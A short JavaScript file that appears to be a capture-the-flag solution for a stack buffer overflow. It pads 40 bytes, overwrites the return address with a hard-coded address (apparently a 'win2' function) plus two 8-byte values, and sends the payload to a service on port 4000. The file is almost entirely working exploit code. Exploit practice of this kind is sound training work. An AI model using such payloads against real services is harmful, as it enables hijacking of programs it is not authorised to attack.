import nc from "../../../utils/nc";

const WIN2 = "\x88\x0B\x40\x00\x00\x00\x00\x00";
const X = "\x37\x13\x37\x13\x37\x13\x37\x13";
const Y = "\x00\x00\x00\x00\x00\x00\x00\x00";
const BUF_SIZE = 32;
const PAYLOAD = "A".repeat(BUF_SIZE + 8) + WIN2 + X + Y;

nc(4000, (data, socket) => {
  console.info(data.toString());
  socket.write(PAYLOAD);
  socket.write("\n");
});
